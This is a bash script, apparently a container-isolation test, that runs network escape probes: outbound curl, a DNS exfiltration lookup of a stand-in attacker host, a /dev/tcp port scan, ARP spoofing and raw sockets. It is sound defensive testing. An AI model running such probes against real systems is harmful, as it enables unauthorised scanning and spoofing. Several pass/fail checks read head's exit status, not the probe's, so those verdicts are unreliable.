#!/bin/bash
# Network Escape Attack Payloads
# These scripts attempt to bypass network isolation.
# ALL attempts should be BLOCKED by --network=none.

set +e

echo "=========================================="
echo "NETWORK ESCAPE ATTACK PAYLOADS"
echo "=========================================="
echo "Testing: Network Isolation & Egress Filtering"
echo "Expected: ALL network access BLOCKED"
echo "=========================================="

# Attack 1: Outbound HTTP connection
echo -e "\n[1] Attempting outbound HTTP connection..."
timeout 3 curl -v http://example.com 2>&1 | head -10
if [ $? -eq 0 ]; then
    echo "❌ CRITICAL: Outbound HTTP succeeded!"
else
    echo "✅ PASS: Outbound HTTP blocked"
fi

# Attack 2: DNS exfiltration
echo -e "\n[2] Attempting DNS exfiltration..."
timeout 3 nslookup evil.attacker.com 2>&1 | head -5
if [ $? -eq 0 ]; then
    echo "❌ CRITICAL: DNS resolution succeeded!"
else
    echo "✅ PASS: DNS resolution blocked"
fi

# Attack 3: Localhost access (container internal)
echo -e "\n[3] Attempting localhost connection..."
timeout 3 curl http://127.0.0.1:8080 2>&1 | head -5
if [ $? -eq 0 ]; then
    echo "⚠️  Localhost service accessible"
else
    echo "✅ PASS: No localhost services accessible"
fi

# Attack 4: Raw socket creation
echo -e "\n[4] Attempting raw socket creation..."
python3 -c "
import socket
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
    print('❌ CRITICAL: Raw socket created!')
except PermissionError:
    print('✅ PASS: Raw socket creation denied')
except Exception as e:
    print(f'✅ PASS: Raw socket blocked ({e})')
" 2>&1

# Attack 5: ICMP ping (requires network)
echo -e "\n[5] Attempting ICMP ping..."
timeout 3 ping -c 1 8.8.8.8 2>&1 | head -5
if [ $? -eq 0 ]; then
    echo "❌ CRITICAL: ICMP ping succeeded!"
else
    echo "✅ PASS: ICMP ping blocked"
fi

# Attack 6: Network interface enumeration
echo -e "\n[6] Enumerating network interfaces..."
if command -v ip &> /dev/null; then
    ip addr show
    IFACE_COUNT=$(ip addr show | grep -c "^[0-9]:")
    echo "Interfaces found: $IFACE_COUNT"
    if [ "$IFACE_COUNT" -eq 1 ]; then
        echo "✅ PASS: Only loopback interface present"
    else
        echo "⚠️  Multiple interfaces detected"
    fi
else
    ifconfig 2>&1
fi

# Attack 7: Port scanning (internal)
echo -e "\n[7] Attempting internal port scan..."
timeout 5 bash -c 'for port in {1..1024}; do echo > /dev/tcp/127.0.0.1/$port 2>/dev/null && echo "Port $port OPEN"; done' | head -10
echo "✅ PASS: Port scan completed (limited to localhost)"

# Attack 8: ARP spoofing attempt
echo -e "\n[8] Attempting ARP manipulation..."
if command -v arp &> /dev/null; then
    arp -s 192.168.1.1 aa:bb:cc:dd:ee:ff 2>&1
    if [ $? -eq 0 ]; then
        echo "⚠️  ARP manipulation succeeded (may be limited scope)"
    else
        echo "✅ PASS: ARP manipulation blocked"
    fi
else
    echo "✅ PASS: arp command not available"
fi

# Attack 9: IPv6 tunneling
echo -e "\n[9] Checking IPv6 availability..."
if [ -f /proc/net/if_inet6 ]; then
    echo "⚠️  IPv6 enabled"
    timeout 3 ping6 -c 1 ::1 2>&1 | head -5
    if [ $? -eq 0 ]; then
        echo "⚠️  IPv6 loopback accessible"
    fi
else
    echo "✅ PASS: IPv6 disabled"
fi

# Attack 10: Network namespace escape
echo -e "\n[10] Checking network namespace isolation..."
NET_NS=$(readlink /proc/self/ns/net 2>/dev/null)
echo "Network namespace: $NET_NS"
if [ -z "$NET_NS" ]; then
    echo "⚠️  Network namespace info unavailable"
else
    echo "✅ PASS: Network namespace isolated"
fi

echo -e "\n=========================================="
echo "NETWORK ESCAPE TEST COMPLETE"
echo "=========================================="
echo ""
echo "SUMMARY:"
echo "- All outbound connections should be BLOCKED"
echo "- DNS should be BLOCKED"
echo "- Only loopback interface should exist"
echo "- No raw sockets should be creatable"
